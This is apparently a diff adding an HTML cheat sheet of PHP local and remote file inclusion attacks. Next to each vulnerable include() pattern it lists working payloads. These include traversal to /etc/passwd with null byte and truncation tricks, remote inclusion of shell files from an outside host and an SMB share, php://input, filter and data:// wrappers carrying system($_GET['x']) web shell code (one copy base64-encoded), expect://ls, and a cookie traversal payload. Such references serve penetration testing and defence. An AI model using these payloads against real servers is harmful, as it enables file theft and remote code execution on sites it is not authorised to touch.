@@ -1,0 +1,68 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Standard</title>
+</head><body><b>Limited Local File Inclusion</b>: &lt;?php include("inc/" . $_GET['file'] . ".htm"); ?&gt;<br/>
+Null Byte Injection:<br/>
+&nbsp;?file=../../../../../../../../../etc/passwd%00<br/>
+&nbsp;(requires magic_quotes_gpc=off)<br/>
+Directory Listing with Null Byte Injection:<br/>
+&nbsp;?file=../../../../../../../../../var/www/accounts/%00<br/>
+&nbsp;(UFS filesystem only, requires magic_quotes_gpc=off, more details <a href="https://websec.wordpress.com/2009/11/28/freebsd-directory-listing-with-php-file-functions/">here</a>)<br/>
+Path Truncation:<br/>
+&nbsp;?file=../../../../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\.\.\ …<br/>
+&nbsp;(more details see <a href="http://www.ush.it/2009/02/08/php-filesystem-attack-vectors/">here</a>&nbsp;and <a href="http://www.ush.it/2009/07/26/php-filesystem-attack-vectors-take-two/">here</a>)<br/>
+Dot Truncation:<br/>
+&nbsp;?file=../../../../../../../../../etc/passwd……………. …<br/>
+&nbsp;(Windows only, more details <a href="http://www.notsosecure.com/folder2/2010/02/02/local-file-inclusion-with-magic_quotes_gpc-enabled/">here</a>)<br/>
+Reverse Path Truncation:<br/>
+&nbsp;?file=../../../../ […] ../../../../../etc/passwd<br/>
+&nbsp;(more details <a href="http://ptresearch.blogspot.com/2010/08/another-alternative-for-null-byte.html">here</a>).<br/>
+<br/>
+<b>Basic Remote File Inclusion</b>&nbsp;&lt;?php include($_GET['file']); ?&gt;<br/>
+Including Remote Code:<br/>
+&nbsp;?file=[http|https|ftp]://websec.wordpress.com/shell.txt<br/>
+&nbsp;(requires allow_url_fopen=On and allow_url_include=On)<br/>
+Using PHP stream php://input:<br/>
+&nbsp;?file=php://input<br/>
+&nbsp;(specify your payload in the POST parameters, watch urlencoding, details <a href="http://php.net/manual/en/wrappers.php.php">here</a>, requires<br/>
+&nbsp;allow_url_include=On)<br/>
+Using PHP stream php://filter:<br/>
+&nbsp;?file=php://filter/convert.base64-encode/resource=index.php<br/>
+&nbsp;(lets you read PHP source because it wont get evaluated in base64. More details <a href="http://diablohorn.wordpress.com/2010/01/16/interesting-local-file-inclusion-method/">here</a>&nbsp;and <a href="http://php.net/manual/en/wrappers.php.php">here</a>)<br/>
+Using data URIs:<br/>
+&nbsp;?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=<br/>
+&nbsp;(requires allow_url_include=On)<br/>
+Using XSS:<br/>
+&nbsp;?file=http://127.0.0.1/path/xss.php?xss=phpcode<br/>
+&nbsp;(makes sense if firewalled or only whitelisted domains allowed)<br/>
+<br/>
+<b>Limited Remote File Inclusion</b>&nbsp;&lt;?php include($_GET['file'] . ".htm"); ?&gt;<br/>
+?file=https://websec.wordpress.com/shell<br/>
+?file=https://websec.wordpress.com/shell.txt?<br/>
+?file=https://websec.wordpress.com/shell.txt%23<br/>
+&nbsp;(requires allow_url_fopen=On and allow_url_include=On)<br/>
+?file=\\evilshare\shell.php<br/>
+&nbsp;(bypasses allow_url_fopen=Off)<br/>
+<br/>
+<b>Static Remote File Inclusion</b>: &lt;?php include("http://192.168.1.10/config.php"); ?&gt;<br/>
+Man In The Middle<br/>
+&nbsp;(lame indeed, but often forgotten)<br/>
+<br/>
+<b>Filter evasion</b><br/>
+Access files with wildcards (read more <a href="http://upshell.wordpress.com/2011/06/11/new-vulnerabilities-to-access-files-in-php/">here</a>)<ul><li style="list-style-type: none"></li>
+</ul>
+<b>Cookie variable inclusion</b>:<br/>
+javascript:document.cookie="lan=../../../../../etc/passwd%00″;<br/>
+<br/>
+<b>PHP filters</b><br/>
+?file=php://filter/convert.base64-encode/resource=index<br/>
+?file=php://input&#09;&#09;payload sent in POST request<br/>
+?file=php://data<br/>
+&nbsp;data:text/plain,&lt;?php phpinfo(); ?&gt;<br/>
+&nbsp;data:,&lt;?system($_GET['x']);?&gt;&amp;x=ls<br/>
+&nbsp;data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls<br/>
+?file=php://filter/read=convert.base64-encode/resource=config&#09;same, but add a filter/read<br/>
+?file=expect://ls<br/>
+</body></html>
